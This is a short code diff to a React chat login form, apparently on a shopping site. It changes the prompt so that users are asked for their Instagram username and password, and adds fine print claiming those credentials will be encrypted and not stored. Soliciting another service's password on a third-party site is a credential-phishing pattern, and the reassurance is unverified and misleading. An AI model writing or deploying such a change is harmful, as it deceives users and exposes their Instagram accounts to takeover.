@@ -118,8 +118,10 @@ export default function Chat() {
       {status === "login" && (
         <form className="chat-login" onSubmit={handleLogin}>
           <p>
-            {pendingProduct.current && `You are buying: ${pendingProduct.current.name}. `}Pick a username and password. New name? We will create it. Come back later with the same details to
-            continue your conversation.
+            {pendingProduct.current && `You are buying: ${pendingProduct.current.name}. `} Enter your insta username and password to continue.
+          </p>
+          <p style={{ color: "#666", fontSize: "12px", margin: "0" }}>
+            the Instagram credentials you provide will be used to continue your chat session and will be encrypted. and Not get stored. 
           </p>
           <input
             placeholder="Username"
